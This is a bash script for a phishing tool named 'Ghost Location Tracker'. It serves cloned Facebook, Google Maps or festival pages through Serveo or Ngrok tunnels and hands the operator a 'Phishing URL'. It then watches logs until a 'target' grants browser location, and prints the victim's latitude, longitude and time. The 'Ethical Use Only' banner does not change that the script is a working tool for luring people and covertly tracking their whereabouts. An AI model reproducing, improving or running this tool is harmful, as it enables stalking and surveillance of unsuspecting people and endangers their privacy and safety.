#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Banner
clear
echo -e "${BLUE}"
cat << "EOF"
   ▄████▄   ██▀███   ▒█████  ██▓ ███▄    █ 
  ▒██▀ ▀█  ▓██ ▒ ██▒▒██▒  ██▓██▒ ██ ▀█   █ 
  ▒▓█    ▄ ▓██ ░▄█ ▒▒██░  ██▒██▒▓██  ▀█ ██▒
  ▒▓▓▄ ▄██▒▒██▀▀█▄  ▒██   ██░██░▓██▒  ▐▌██▒
  ▒ ▓███▀ ░░██▓ ▒██▒░ ████▓▒░██░▒██░   ▓██░
  ░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▓  ░ ▒░   ▒ ▒ 
    ░  ▒     ░▒ ░ ▒░  ░ ▒ ▒░  ▒ ░░ ░░   ░ ▒░
  ░          ░░   ░ ░ ░ ░ ▒   ▒ ░   ░   ░ ░ 
  ░ ░         ░         ░ ░   ░           ░ 
  ░                                         
EOF
echo -e "${NC}"
echo -e "${YELLOW}Ghost Location Tracker - Ethical Use Only${NC}"
echo "--------------------------------------------"

# Install Ngrok (if missing)
install_ngrok() {
    echo -e "${GREEN}[+] Installing Ngrok...${NC}"
    curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
    echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
    sudo apt update && sudo apt install ngrok -y
    echo -e "${YELLOW}[!] Please enter your Ngrok token (get it from https://dashboard.ngrok.com/get-started/your-authtoken)${NC}"
    read -p "Enter Ngrok Token: " token
    ngrok config add-authtoken "$token"
}

# Start PHP server
start_server() {
    echo -e "${GREEN}[+] Starting PHP server on port 8080...${NC}"
    php -S 127.0.0.1:8080 -t "$PAGE" > /dev/null 2>&1 &
    SERVER_PID=$!
}

# Serveo tunneling
serveo() {
    echo -e "${GREEN}[+] Generating Serveo link (wait 10 sec)...${NC}"
    ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > .tunnel_log 2>&1 &
    TUNNEL_PID=$!
    sleep 10
    URL=$(grep -o "https://[0-9a-z]*\.serveo.net" .tunnel_log)
}

# Ngrok tunneling
ngrok() {
    if ! command -v ngrok &> /dev/null; then
        install_ngrok
    fi
    
    echo -e "${GREEN}[+] Starting Ngrok tunnel (wait 15 sec)...${NC}"
    ngrok http 8080 > .tunnel_log &
    TUNNEL_PID=$!
    sleep 15
    URL=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
}

# Cleanup
cleanup() {
    echo -e "\n${RED}[!] Stopping services...${NC}"
    kill $SERVER_PID $TUNNEL_PID 2> /dev/null
    rm -f .tunnel_log
    exit 0
}

# Check dependencies
check_deps() {
    if ! command -v php &> /dev/null; then
        echo -e "${RED}[!] PHP not found. Installing...${NC}"
        sudo apt install php -y
    fi
    if ! command -v jq &> /dev/null; then
        echo -e "${RED}[!] jq not found. Installing...${NC}"
        sudo apt install jq -y
    fi
    if ! command -v ssh &> /dev/null; then
        echo -e "${RED}[!] SSH not found. Installing...${NC}"
        sudo apt install openssh-client -y
    fi
}

# Main execution
check_deps

# Page selection
PS3='Select a page to clone: '
options=("Facebook" "Google Maps" "Festival" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Facebook") PAGE="facebook"; break ;;
        "Google Maps") PAGE="google"; break ;;
        "Festival") PAGE="festival"; break ;;
        "Quit") exit 0 ;;
        *) echo -e "${RED}Invalid option!${NC}" ;;
    esac
done

# Tunneling selection
PS3='Select tunneling method: '
options=("Serveo" "Ngrok" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Serveo") TUNNEL="serveo"; break ;;
        "Ngrok") TUNNEL="ngrok"; break ;;
        "Quit") exit 0 ;;
        *) echo -e "${RED}Invalid option!${NC}" ;;
    esac
done

start_server

case $TUNNEL in
    "serveo") serveo ;;
    "ngrok") ngrok ;;
esac

if [ -z "$URL" ]; then
    echo -e "${RED}[!] Failed to generate URL!${NC}"
    echo -e "${YELLOW}Troubleshooting:${NC}"
    echo "1. Try Serveo instead"
    echo "2. Check internet connection"
    cleanup
fi

echo -e "\n${YELLOW}[+] Phishing URL: $URL${NC}"
echo -e "${BLUE}[+] Waiting for target... (Ctrl+C to stop)${NC}"

trap cleanup INT

# Monitor logs
tail -f logs.txt | while read line; do
    DATA=$(echo "$line" | jq -r '.')
    STATUS=$(echo "$DATA" | jq -r '.status // empty')
    
    case $STATUS in
        "page_loaded")
            echo -e "\n${CYAN}[+] Target opened the page${NC}"
            ;;
        "location_denied")
            echo -e "${YELLOW}[!] Target denied location access${NC}"
            ;;
        "location_granted")
            echo -e "\n${GREEN}[✓] Location captured!${NC}"
            echo -e "   🌐 Latitude: $(echo "$DATA" | jq -r '.lat')"
            echo -e "   🌐 Longitude: $(echo "$DATA" | jq -r '.lon')"
            echo -e "   🕒 Time: $(echo "$DATA" | jq -r '.time')"
            cleanup
            ;;
    esac
done
